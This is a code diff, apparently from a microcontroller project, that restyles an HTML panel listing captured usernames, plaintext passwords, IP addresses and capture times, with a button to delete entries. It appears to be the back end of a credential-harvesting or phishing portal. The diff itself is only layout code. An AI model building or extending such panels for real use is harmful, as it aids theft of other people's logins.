@@ -348,12 +348,7 @@ namespace
     }
 
     String html;
-    html += "<div style='overflow:auto'><table style='width:100%;border-collapse:collapse'>";
-    html += "<thead><tr><th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Usuario</th>";
-    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Senha</th>";
-    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>IP</th>";
-    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Uptime</th>";
-    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Acao</th></tr></thead><tbody>";
+    html += "<div style='display:flex;flex-direction:column;gap:12px;margin-top:12px'>";
 
     for (size_t i = entries.size(); i > 0; i--)
     {
@@ -364,20 +359,34 @@ namespace
       unsigned long capturedAt = item["captured_at_ms"] | 0;
       size_t entryIndex = i - 1;
 
-      html += "<tr>";
-      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(username) + "</td>";
-      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(password) + "</td>";
-      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(ip) + "</td>";
-      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + String(capturedAt) + " ms</td>";
-      html += "<td style='padding:8px;border-bottom:1px solid #262626'>";
-      html += "<form method='post' action='/credentials/delete' onsubmit=\"return confirm('Apagar este login?')\">";
+      html += "<div style='background:#1f1f1f;border-left:4px solid #00a6ff;padding:16px;border-radius:8px'>";
+      html += "<div style='display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:12px'>";
+
+      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #00a6ff'>";
+      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Usuário</span>";
+      html += "<div style='color:#00a6ff;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(username) + "</div>";
+      html += "</div>";
+
+      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #ff7675'>";
+      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Senha</span>";
+      html += "<div style='color:#ff7675;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(password) + "</div>";
+      html += "</div>";
+
+      html += "</div>";
+      html += "<div style='display:flex;justify-content:space-between;align-items:center;gap:12px'>";
+      html += "<div style='flex:1;display:flex;gap:16px;font-size:12px'>";
+      html += "<div><span style='color:#aaa'>IP:</span> <span style='color:#58d68d'>" + escapeHtml(ip) + "</span></div>";
+      html += "<div><span style='color:#aaa'>Capturado:</span> <span style='color:#ffb347'>" + String(capturedAt) + " ms</span></div>";
+      html += "</div>";
+      html += "<form method='post' action='/credentials/delete' onsubmit=\"return confirm('Apagar este login?')\" style='margin:0'>";
       html += "<input type='hidden' name='index' value='" + String(entryIndex) + "'>";
-      html += "<button type='submit' style='margin:0;padding:6px 10px;border-radius:8px;border:0;background:#8b2d2d;color:#fff;cursor:pointer'>Apagar</button>";
-      html += "</form></td>";
-      html += "</tr>";
+      html += "<button type='submit' style='padding:8px 14px;border-radius:6px;border:0;background:#8b2d2d;color:#fff;cursor:pointer;font-weight:bold;white-space:nowrap;font-size:12px'>🗑️ Apagar</button>";
+      html += "</form>";
+      html += "</div>";
+      html += "</div>";
     }
 
-    html += "</tbody></table></div>";
+    html += "</div>";
     return html;
   }
 
